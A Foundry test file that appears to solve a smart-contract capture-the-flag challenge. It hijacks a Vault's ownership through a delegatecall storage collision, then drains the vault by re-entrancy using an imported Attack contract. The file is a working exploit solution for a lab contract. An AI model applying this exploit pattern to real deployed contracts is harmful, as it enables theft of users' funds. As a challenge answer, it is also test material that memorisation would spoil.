// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // bytes32 pass = vm.load(address(vault), bytes32(uint256(1)));
        bytes32 pass = bytes32(uint256(uint160(address(logic))));
        //0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459
        assertEq(pass, vm.load(address(vault), bytes32(uint256(1))));
        VaultLogic(address(vault)).changeOwner(pass, address(palyer));
        assertEq(vault.owner(), address(palyer));
        // 打开canWithdraw开关
        vault.openWithdraw();
        assertEq(vault.canWithdraw(), true);

        // 重入攻击
        //1 deploy the attack contract
        Attack attack = new Attack();
        //2 call the attack contract
        // Let the attack contract deposit 1 ether to the vault by calling its deposite() function
        attack.deposit{value: 0.1 ether}(payable(address(vault)));
        //3 use attach to call the withdraw function
        attack.callWithdraw(payable(address(vault)));

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
